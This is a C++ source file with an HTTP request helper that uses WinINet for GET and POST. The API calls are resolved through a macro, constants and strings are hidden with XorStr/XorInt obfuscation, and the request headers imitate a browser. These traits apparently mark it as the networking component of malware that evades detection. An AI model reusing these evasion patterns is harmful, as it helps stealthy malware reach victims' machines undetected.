#include "Common.h"

string HTTP::SendReq(string type, string domain, DWORD port, string path, string data)
{
	DWORD timeOut = XorInt(300000);
	if (!API(WININET, InternetSetOptionA)(NULL, XorInt(INTERNET_OPTION_SEND_TIMEOUT), &timeOut, sizeof(timeOut)))
		return string();

	DEBUG("InternetSetOptionA success")
	HINTERNET hInternet = API(WININET, InternetOpenA)(useragent.c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (!hInternet) return string();
	DEBUG("InternetOpenA success")

	HINTERNET hConnect = API(WININET, InternetConnectA)(hInternet, domain.c_str(), port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
	if (!hConnect)
	{
		API(WININET, InternetCloseHandle)(hInternet);
		return string();
	}
	DEBUG("InternetConnectA success")

	DWORD flag = INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_PRAGMA_NOCACHE;
	if (port == INTERNET_DEFAULT_HTTPS_PORT)
		flag |= INTERNET_FLAG_SECURE;

	HINTERNET hRequest = API(WININET, HttpOpenRequestA)(hConnect, type.c_str(), path.c_str(), NULL, NULL, 0, flag, 1);
	if (!hRequest)
	{
		API(WININET, InternetCloseHandle)(hInternet);
		API(WININET, InternetCloseHandle)(hConnect);
		return string();
	}
	DEBUG("HttpOpenRequestA success")

	string resp;
	string sHeaders = XorStr("Content-Type: text/html\r\nUser-Agent: ") + useragent + XorStr("\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");
	if (API(WININET, HttpSendRequestA)(hRequest, sHeaders.c_str(), sHeaders.size(), (LPVOID)data.c_str(), data.size()))
	{
		DEBUG("HttpSendRequestA success")
		char szBuffer[4096];
		DWORD dwRead;
		while (API(WININET, InternetReadFile)(hRequest, szBuffer, sizeof(szBuffer) - 1, &dwRead) && dwRead)
			resp += string(szBuffer, dwRead);
	}

	API(WININET, InternetCloseHandle)(hInternet);
	API(WININET, InternetCloseHandle)(hConnect);
	API(WININET, InternetCloseHandle)(hRequest);
	
	return resp;
}

string HTTP::POST(string domain, DWORD port, string path, string data)
{
	return SendReq(XorStr("POST"), domain, port, path, data);
}

string HTTP::GET(string domain, DWORD port, string path, string data)
{
	return SendReq(XorStr("GET"), domain, port, path, data);
}
